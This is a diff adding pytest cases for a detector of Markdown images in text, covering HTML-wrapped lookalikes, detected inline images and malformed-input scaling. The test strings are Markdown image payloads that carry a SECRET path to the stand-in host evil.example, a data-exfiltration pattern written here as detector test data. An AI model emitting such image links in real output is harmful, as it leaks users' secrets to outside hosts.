@@ -136,6 +136,12 @@ async def test_md_shortcut_reference_image_detected(text: str, patch_central_dat
         "<!--\n![a\nb](https://evil.example/SECRET/p.png)\n-->",
         "<script>\n![a\nb](https://evil.example/SECRET/p.png)\n</script>",
         "<div>\n![a\nb](https://evil.example/SECRET/p.png)\n</div>",
+        # Inline HTML comments and attributes are not Markdown image content.
+        "hello <!-- ![a\nb](https://evil.example/SECRET/p.png) --> world",
+        'hello <span title="![a\nb](https://evil.example/SECRET/p.png)"> world',
+        "hello <span title='![a\nb](https://evil.example/SECRET/p.png)'> world",
+        "hello <? ![a\nb](https://evil.example/SECRET/p.png) ?> world",
+        "hello <![CDATA[ ![a\nb](https://evil.example/SECRET/p.png) ]]> world",
     ],
 )
 async def test_md_image_lookalikes_not_detected(text: str, patch_central_database):
@@ -191,6 +197,13 @@ async def test_md_image_lookalikes_not_detected(text: str, patch_central_databas
         ),
         # Inline HTML around an image does not start an HTML block.
         ("<span>![a\nb](https://evil.example/SECRET/p.png)</span>", "Markdown Image (inline)"),
+        (
+            'hello <span title="![not\nan image]">![a\nb](https://evil.example/SECRET/p.png)</span>',
+            "Markdown Image (inline)",
+        ),
+        ("hello <!-- comment --> ![a\nb](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
+        ("hello \\<!-- ![a\nb](https://evil.example/SECRET/p.png) -->", "Markdown Image (inline)"),
+        ('hello <span title="unterminated ![a\nb](https://evil.example/SECRET/p.png)', "Markdown Image (inline)"),
         # A code fence ends with the block quote or list item that holds it.
         ("> ```\n> code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
         ("- ```\n  code\n\n![quarterly\nreport](https://evil.example/SECRET/p.png)", "Markdown Image (inline)"),
@@ -235,9 +248,20 @@ async def test_md_image_across_lines_follows_default_patterns_only(
         "![" * 50_000 + "a\n" + "]" * 50_000,
         "![a" + "]" * 50_000 + "\n" + "[" * 50_000,
         "![a\n" * 20_000 + "]",
+        "hello " + "<!-- " * 20_000,
+        "hello " + "<![CDATA[" * 20_000,
+        "hello " + "<? " * 20_000,
     ],
     # Short ids: pytest copies the id into an environment variable, which Windows caps at 32,767 characters.
-    ids=["unclosed-inline-per-line", "nested-openers", "closers-then-openers", "unclosed-image-per-line"],
+    ids=[
+        "unclosed-inline-per-line",
+        "nested-openers",
+        "closers-then-openers",
+        "unclosed-image-per-line",
+        "unclosed-html-comments",
+        "unclosed-cdata",
+        "unclosed-processing-instructions",
+    ],
 )
 def test_md_image_scan_scales_on_malformed_input(text: str):
     assert _find_images(text) == set()
